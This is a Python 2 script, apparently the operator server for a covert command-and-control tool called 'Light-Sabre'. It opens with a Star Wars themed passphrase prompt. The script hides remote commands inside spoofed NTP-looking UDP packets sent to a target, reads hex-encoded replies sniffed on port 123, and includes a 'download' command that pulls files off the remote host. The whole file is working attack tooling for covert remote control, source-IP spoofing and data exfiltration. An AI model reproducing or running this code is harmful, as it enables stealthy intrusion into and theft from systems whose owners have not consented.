#!/usr/bin/env python

from scapy.all import *
import os
import sys
import string
import base64
import argparse
import readline
import subprocess
import time
import commands
#histfile = os.path.join(os.path.expanduser("~"), ".ntphist")
#print histfile

t = strftime("%d-%m-%Y_%H-%M-%S", gmtime())

parser = argparse.ArgumentParser(description='Server for Light-Sabre Covert C2 Channel.')
parser.add_argument('-n', '--net', metavar='N', type=str,
                    help='First the Octets of network to spoof IP from. Example: 192.168.0 ')
parser.add_argument('-t', '--target', metavar='N', type=str,
                    help='Target IP.')
parser.add_argument('-p', '--port', metavar='N', nargs='?', type=int, default=50000,
                    help='Target Port.')
parser.add_argument('-s', '--spoof', metavar='N', nargs='?', type=str,
                    help='NTP server IP to spoof as. Example: 192.168.0.1')
parser.add_argument('-in', '--interval', metavar='N', nargs='?', type=int, default=10,
                    help='Interval between packets being sent. Example: "10" will randomly send packets between 1 and 10 seconds.')
parser.add_argument('-cd', '--clientdelimiter', metavar='N', nargs='?', type=str, default='\x23',
                    help='Char to delmite recieved packet C2 data from client header. Example NTP is "\x23"')
parser.add_argument('-H', '--header', metavar='N', nargs='?', type=str, default="\x24\x00\x00\x00",
                    help='Header for packet. Exmaple NTP is "\x24\x00\x00\x00" at 4 bytes long.')
parser.add_argument('-pl', '--packetlen', metavar='N', nargs='?', type=int, default=44,
                    help='Packet total length excluding header. This determins any padding calculations. Example NTP is 44 with out the header.')
parser.add_argument('-pc', '--paddingchar', metavar='N', nargs='?', type=str, default='\x00',
                    help='Hex char to pad with. Exmaple "\x00"')
parser.add_argument('-sp', '--sport', metavar='N', nargs='?', type=int, default=123,
                    help='Source port for the packets sent. Example NTP server sends from 123.')
parser.add_argument('-l', '--log', metavar='N', nargs='?', type=str, default="%s-lsabre.log" % t,
                    help='Log to specified filename. If none specified it will log to local directory as {timestamp}-lsabre.log .')



#Setup Realine for Command History for session
try:
	#readline.read_history_file(histfile)
	readline.set_history_length(1000)
	readline.parse_and_bind('tab: complete')
	readline.parse_and_bind('set editing-mode vi')
except IOError:
	pass

#Variables
args = parser.parse_args()
if args.net:
	net = args.net + '.' #sys.argv[1]
	src_ip= net + str(random.randrange(0,255, 1))     #sys.argv[1]
if args.target:
	ntp_ip = args.target
if args.spoof:
	spoof = args.spoof
if args.interval:
	interval = args.interval
payload = "\x68\x65\x6c\x6c\x6f\x20\x6e\x61\x6e\x64\x6f"
message = []
port = args.port
EOL = ';;;'
dwnfile = ''
destp = args.port
cdelim = args.clientdelimiter	#This is used to delimit the recieved packets by a char to get only the payload message and not the header
header = args.header
pad = args.paddingchar
plen = args.packetlen
sourcep = args.sport
if args.log:
	log = args.log
if log:
	log = '%s-' % t + log
f = open(log, 'w')
f = open(log, 'a')
u = commands.getstatusoutput('whoami')[1]

#Print Banner
subprocess.call(["clear"])
subprocess.call(["cat", "./ls-banner.txt"])

print ''
q = raw_input('What Color Crystal are you wanting to use (RED, BLUE, PURPLE, etc..) ? ')
print str(q).lower()
if str(q).lower() == 'red':
	q = raw_input('What Order are we Executing??? ')
	if str(q).lower() == '66':
		subprocess.call(['cat', './sl-banner.txt'])
		print ''
		print 'Welcome Sith Lord!'
		print ''
	else:
		print ''
		print 'I find your lack of faith is disturbing.....'
		print ''
		subprocess.call(['cat','./vs-banner.txt'])
		print ''
		print ''
		print '...... Vader Breathing...... Choking Sounds....... Your Death......'
		print ''
		quit()
else:
	print 'These are not the droids you are looking for.....'
	print 'Jedi Scum....'
	quit()


def fuzztime():
	t = random.randint(1,interval)
	time.sleep(t)

def sendme(pyld):
	global destp
	global src_ip
	global ntp_ip
	global header
	global pad
	global plen
	global sourcep
	global i
	fuzztime()
	packet = IP(src=src_ip,dst=ntp_ip)/UDP(dport=destp,sport=sourcep)/(str(header)+ str(pyld) + str(pad)*(int(plen)-len(pyld)))
	send(packet, verbose=0)

def c2(packet):
	global net
	global dwnfile
	global destp
	global t
	global f
	global u
	global src_ip
	#global spoof
	if spoof:
		src_ip= spoof
	else:
		src_ip= net + str(random.randrange(0,255, 1))
	filtered_string = ''.join(filter(lambda x:x in string.printable, str(packet[0])))
	global message
	filtered_string = str(filtered_string).split(cdelim)
	if len(filtered_string) > 1:
		message.append(str(filtered_string[1]))
	for i in message:
		if EOL in i:
			if packet[UDP].sport != 123:
				destp = packet[UDP].sport
			print ''
			messageout = []
			for i in message[:-1]:
				try:
					i = base64.b16decode(i)
				except:
					break
				if i == 'upfile':
					f = open(dwnfile+'NTP', 'w')
					for c in message[:-1]:
						try:
							c = base64.b16decode(c)
						except:
							c = c
						if c == 'upfile':
							print ''
						else:
							f.write(c)
					f.close()
					messageout.append("File %s Downloaded!" % dwnfile)
					message = []
					break
				else:
					messageout.append(i)
			messageout = ''.join(map(str, messageout))
			print messageout
			f.write(str(messageout)+'\n')
			f.write('\n')
			message = []
			print ''
			payload = raw_input('Command Example(Order 66): ')
			if payload == 'reset':
				break
			if payload == 'exit':
				f.close()
				quit()
			payloadlog = str(t)+' '+str(u)+' '+'Command Example(Order 66): '+str(payload)
			f.write(str(payloadlog)+'\n')
			f.write('\n')
			if payload.split(' ')[0] == 'download':
				dwnfile = payload.split(' ')[1]
			pay = []
			payload = base64.b16encode(payload)
			pay = re.findall('.{1,12}', payload)
			#print pay
			for i in pay:
				sendme(i)
			sendme(EOL)
				
p = sniff(filter="udp port 123", prn=c2)
